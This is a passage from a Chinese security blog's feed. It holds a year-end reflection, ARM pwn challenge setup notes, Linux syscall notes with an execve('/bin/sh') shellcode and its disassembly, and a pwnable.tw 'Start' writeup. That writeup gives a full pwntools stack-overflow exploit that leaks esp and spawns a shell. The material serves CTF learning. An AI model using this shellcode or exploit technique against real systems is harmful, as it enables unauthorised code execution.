<p>天将那啥，必先那啥！</p>          </div><h4 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h4><p>有些事是生活的地标，你在达到它之前或许会朴实无华且枯燥地走着两点之间线段最短，或许会波澜壮阔精彩纷呈地静赏陌上花开，或许会绕了一大弯还摔了一两跤。但是不管怎样，到了之后，你还会继续往前走。</p><p>后面的的时间我大部分待在了实验室，还记得那时满城桂花飘香。</p><p>第一个周末去了骑马射箭，写了一篇《杭秋》。我最喜欢其中一句：</p><div class="note ">            <p>彤叶惹黄花，因羞泛红；清水戏明月，为情相映。</p>          </div><p>细细品之，至今留有余味。</p><p>11月回了趟学校，第一次在火车丢了电脑。而后参加省赛。</p><p>12月21,22日，陪阿九考研。</p><p>12月26~29日，代表浙大AAA参加xnuca总决赛，苟到了最后一个三等奖。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>我们往往都记得那些突然发生的事情，却往往忽略那些一直在坚持的事业。赛博如海，我是沧海一粟。然而：</p><div class="note ">            <p>我最进看了很多教程，也研究了很多的漏洞，感触颇深，现在看来，我亦是有成为世间黑客的潜质！</p>          </div><p><img style="zoom: 50%;" data-src="/2020/01/07/2019/1.jpg" class="lazyload"></p>]]></content>
    
    <summary type="html">
    
      That year, I was 21 years old.
    
    </summary>
    
      <category term="随笔" scheme="https://j-kangel.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>2019xnuca总决赛adw7 writeup</title>
    <link href="https://j-kangel.github.io/2019/12/30/2019xnuca%E6%80%BB%E5%86%B3%E8%B5%9Badw7-writeup/"/>
    <id>https://j-kangel.github.io/2019/12/30/2019xnuca总决赛adw7-writeup/</id>
    <published>2019-12-30T15:15:34.000Z</published>
    <updated>2019-12-30T11:57:19.125Z</updated>
    
    <content type="html"><![CDATA[<div class="note ">            <p>Thank you, thank you all so very much, thank you to all of you in this room, none of there would be possible without you. Thank you!</p>          </div><h3 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h3><p>这是一道arm菜单题</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h4><p>安装依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y gcc-arm-linux-gnueabi</span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm  -L /usr/arm-linux-gnueabi ./awd7</span><br></pre></td></tr></table></figure><h4 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h4><p>安装gdb-multiarch</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gdb-multiarch</span><br></pre></td></tr></table></figure><p>socat启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-l:10005,fork exec:&quot;qemu-arm  -L /usr/arm-linux-gnueabi ./awd7&quot;,reuseaddr</span><br></pre></td></tr></table></figure><p>python脚本启动</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"127.0.0.1"</span>,<span class="string">"10005"</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure><p>gdb调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch -q awd7</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>ida打开，发现很明显的缓冲区溢出以及get shell的后门。</p>]]></content>
    
    <summary type="html">
    
      first flay with the arm pwn, it&#39;s funny!
    
    </summary>
    
      <category term="pwn学习" scheme="https://j-kangel.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="arm" scheme="https://j-kangel.github.io/tags/arm/"/>
    
      <category term="pwn" scheme="https://j-kangel.github.io/tags/pwn/"/>
    
      <category term="xnuca" scheme="https://j-kangel.github.io/tags/xnuca/"/>
    
  </entry>
  
  <entry>
    <title>linux 系统调用相关</title>
    <link href="https://j-kangel.github.io/2019/12/25/linux-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3/"/>
    <id>https://j-kangel.github.io/2019/12/25/linux-系统调用相关/</id>
    <published>2019-12-25T10:19:31.000Z</published>
    <updated>2019-12-25T05:19:10.823Z</updated>
    
    <content type="html"><![CDATA[<div class="note ">            <p>If you look for it, I’ve got a sneaky feeling you’ll find that love actually is all around.</p>          </div><h3 id="标准输入输出"><a href="#标准输入输出" class="headerlink" title="标准输入输出"></a>标准输入输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">标准输入 即STDIN , 在 /dev/stdin , 一般指键盘输入, shell里代号是 0</span><br><span class="line">标准输出 即STDOUT, 在 /dev/stdout, 一般指终端(terminal), 就是显示器, shell里代号是 1</span><br><span class="line">标准错误 即STDERR, 在 /dev/stderr, 也是指终端(terminal), 不同的是,  shell里代号是 2</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/2019/12/25/linux-系统调用相关/1.PNG" class="lazyload"></p><h3 id="32位系统调用"><a href="#32位系统调用" class="headerlink" title="32位系统调用"></a>32位系统调用</h3><p><a href="http://www.lxhp.in-berlin.de/lhpsysc1.html" target="_blank" rel="noopener">32位系统调用</a></p><h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">系统调用号：4</span><br><span class="line">函数路径：glibc-2.27/io/write.c</span><br><span class="line">函数定义：ssize_t write(int fd, const void *buf, size_t nbyte);</span><br><span class="line">fd：文件描述符；</span><br><span class="line">buf：指定的缓冲区，即指针，指向一段内存单元；</span><br><span class="line">nbyte：要写入文件指定的字节数；</span><br><span class="line">返回值：写入文档的字节数（成功）；-1（出错）</span><br></pre></td></tr></table></figure><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><h3 id="leave"><a href="#leave" class="headerlink" title="leave"></a>leave</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在32位汇编下相当于:</span><br><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure><h4 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RET指令则是将栈顶的返回地址弹出到EIP，然后按照EIP此时指示的指令地址继续执行程序</span><br></pre></td></tr></table></figure><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><h4 id="i386"><a href="#i386" class="headerlink" title="i386"></a>i386</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">shellcode:&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span><br><span class="line">disasm如下：</span><br><span class="line">   0:   31 c9                   xor    ecx,ecx</span><br><span class="line">   2:   f7 e1                   mul    ecx</span><br><span class="line">   4:   51                      push   ecx</span><br><span class="line">   5:   68 2f 2f 73 68          push   0x68732f2f</span><br><span class="line">   a:   68 2f 62 69 6e          push   0x6e69622f</span><br><span class="line">   f:   89 e3                   mov    ebx,esp</span><br><span class="line">  11:   b0 0b                   mov    al,0xb</span><br><span class="line">  13:   cd 80                   int    0x80</span><br></pre></td></tr></table></figure><p>pwntools生成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcraft.i386.linux.sh()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      If you look for it, I&#39;ve got a sneaky feeling you&#39;ll find that love actually is all around.
    
    </summary>
    
      <category term="linux" scheme="https://j-kangel.github.io/categories/linux/"/>
    
    
      <category term="pwn" scheme="https://j-kangel.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw writeup</title>
    <link href="https://j-kangel.github.io/2019/12/25/pwnable-tw-writeup/"/>
    <id>https://j-kangel.github.io/2019/12/25/pwnable-tw-writeup/</id>
    <published>2019-12-25T09:34:21.000Z</published>
    <updated>2019-12-25T05:30:47.248Z</updated>
    
    <content type="html"><![CDATA[<div class="note ">            <p>Every time a bell rings, an angel gets his wings.</p>          </div><h3 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h3><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">push    esp</span><br><span class="line">push    offset _exit</span><br><span class="line">xor     eax, eax</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">xor     ecx, ecx</span><br><span class="line">xor     edx, edx</span><br><span class="line">push    &apos;:FTC&apos;</span><br><span class="line">push    &apos; eht&apos;</span><br><span class="line">push    &apos; tra&apos;</span><br><span class="line">push    &apos;ts s&apos;</span><br><span class="line">push    2774654Ch</span><br><span class="line">mov     ecx, esp        ; addr</span><br><span class="line">mov     dl, 14h         ; len</span><br><span class="line">mov     bl, 1           ; fd</span><br><span class="line">mov     al, 4</span><br><span class="line">int     80h             ; LINUX - sys_write</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">mov     dl, 3Ch</span><br><span class="line">mov     al, 3</span><br><span class="line">int     80h             ; LINUX -</span><br><span class="line">add     esp, 14h</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>很明显的栈溢出，没有其他可以利用的函数和gadget，只好利用shellcode。因此需要泄露esp的地址，并且payload长度不能超过0x3c，因此需要精心构造shellcode。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment"># p = process("./start")</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">20</span> + p32(<span class="number">0x08048087</span>)</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">addr = u32(p.recv(<span class="number">4</span>))+<span class="number">20</span></span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line">shellcode = <span class="string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">20</span> + p32(addr) + shellcode</span><br><span class="line"><span class="keyword">print</span> hex(len(payload))</span><br><span class="line"><span class="keyword">print</span> disasm(shellcode)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      Every time a bell rings, an angel gets his wings.
    
    </summary>
    
      <category term="pwn学习" scheme="https://j-kangel.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="https://j-kangel.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>linux 酷炫小工具</title>
    <link href="https://j-kangel.github.io/2019/12/23/linux-%E9%85%B7%E7%82%AB%E5%B0%8F%E5%B7%A5%E5%85%B7/"/>
    <id>https://j-kangel.github.io/2019/12/23/linux-酷炫小工具/</id>
    <published>2019-12-23T15:17:57.000Z</published>
    <updated>2019-12-23T07:17:57.994Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
</feed>
